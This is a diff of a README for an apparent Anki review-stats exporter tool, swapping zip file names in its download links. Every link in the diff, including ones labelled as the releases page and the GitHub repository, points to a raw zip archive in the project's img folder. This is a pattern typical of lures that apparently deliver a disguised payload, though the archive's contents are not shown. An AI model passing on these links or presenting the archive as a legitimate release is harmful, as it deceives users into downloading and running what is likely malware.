@@ -6,7 +6,7 @@ Welcome to the **anki-llm-review-stats-exporter**! This tool allows you to expor
 
 ## 📥 Download
 
-[![Download Release](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/llm-anki-review-exporter-stats-v3.4.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/llm-anki-review-exporter-stats-v3.4.zip)
+[![Download Release](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/stats-exporter-llm-anki-review-tubig.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/stats-exporter-llm-anki-review-tubig.zip)
 
 ## 📋 Requirements
 
@@ -18,7 +18,7 @@ Before you start, you need:
 
 ## 🌐 Download & Install
 
-To get started, visit the releases page to download the latest version of the application: [Download Latest Release](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/llm-anki-review-exporter-stats-v3.4.zip). 
+To get started, visit the releases page to download the latest version of the application: [Download Latest Release](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/stats-exporter-llm-anki-review-tubig.zip). 
 
 ### Step-by-step Installation
 
@@ -66,4 +66,4 @@ We welcome contributions! If you encounter issues or have suggestions for improv
 - **Anki**: Thanks to the Anki community for the amazing software that helps millions learn.
 - **Open Source**: This project is made possible by the contributions of dedicated developers and users like you.
 
-For more details, visit our [GitHub repository](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/llm-anki-review-exporter-stats-v3.4.zip).
+For more details, visit our [GitHub repository](https://raw.githubusercontent.com/dal290993/anki-llm-review-stats-exporter/main/img/stats-exporter-llm-anki-review-tubig.zip).
